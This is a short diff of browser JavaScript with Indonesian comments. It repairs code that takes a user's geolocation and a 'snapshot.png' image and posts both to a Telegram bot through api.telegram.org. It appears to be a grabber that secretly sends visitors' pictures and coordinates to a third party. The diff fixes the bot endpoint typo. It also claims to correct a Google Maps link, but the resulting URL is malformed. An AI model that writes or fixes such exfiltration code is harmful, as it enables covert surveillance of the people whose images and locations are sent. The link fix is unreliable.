@@ -93,6 +93,7 @@
                 (position) => {
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
+                    // PERBAIKAN: Format tautan peta eksternal Google Maps yang benar
                     const teksLokasi = `📌 **Lokasi Pengguna:**\nLatitude: ${lat}\nLongitude: ${lon}\n🔗 [Buka di Google Maps](https://google.com{lat},${lon})`;
                     
                     prosesPengiriman(finalRecipientId, imageBlob, teksLokasi);
@@ -153,8 +154,10 @@
                 formData.append('chat_id', chatIdToSend);
                 formData.append('photo', blob, 'snapshot.png');
                 formData.append('caption', captionTeks);
+                formData.append('parse_mode', 'Markdown'); // Agar format tebal dan link berfungsi
 
-                await fetch(`https://api.telegram.org/bit${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                // PERBAIKAN: Mengubah endpoint '/bit' menjadi '/bot'
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 });
